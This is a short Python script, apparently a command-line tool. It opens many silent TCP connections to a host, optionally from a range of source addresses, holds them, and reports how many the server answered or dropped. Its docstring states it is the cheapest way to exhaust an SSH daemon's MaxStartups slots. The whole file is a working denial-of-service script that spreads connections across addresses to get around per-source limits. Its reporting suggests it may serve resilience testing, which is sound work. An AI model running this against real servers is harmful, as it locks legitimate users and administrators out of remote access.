#!/usr/bin/env python3
"""Open N TCP connections, never speak, hold them, then report their fate.

    holdopen.py HOST PORT N SECONDS [PREFIX FIRST LAST]

With PREFIX FIRST LAST the connections are spread over the source addresses
PREFIX.FIRST .. PREFIX.LAST (which the caller has added to the interface).

Prints JSON: how many connected, how many received the server's banner, and
how many the server had closed by the end. This is the cheapest way to use
up an sshd's unauthenticated-connection slots (MaxStartups).
"""

import json
import socket
import sys
import time

host, port, count, seconds = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), float(sys.argv[4])
sources = [None]
if len(sys.argv) > 5:
    sources = [(f"{sys.argv[5]}.{i}", 0) for i in range(int(sys.argv[6]), int(sys.argv[7]) + 1)]
socks = []
for n in range(count):
    try:
        socks.append(socket.create_connection((host, port), timeout=3, source_address=sources[n % len(sources)]))
    except OSError:
        pass
print(json.dumps({"connected": len(socks)}), flush=True)
time.sleep(seconds)
banner = closed = 0
for s in socks:
    s.setblocking(False)
    got = b""
    try:
        while True:
            data = s.recv(4096)
            if not data:
                closed += 1
                break
            got += data
    except BlockingIOError:
        pass
    except OSError:
        closed += 1
    if got.startswith(b"SSH-"):
        banner += 1
    s.close()
print(json.dumps({"connected": len(socks), "got_banner": banner, "closed_by_server": closed}))
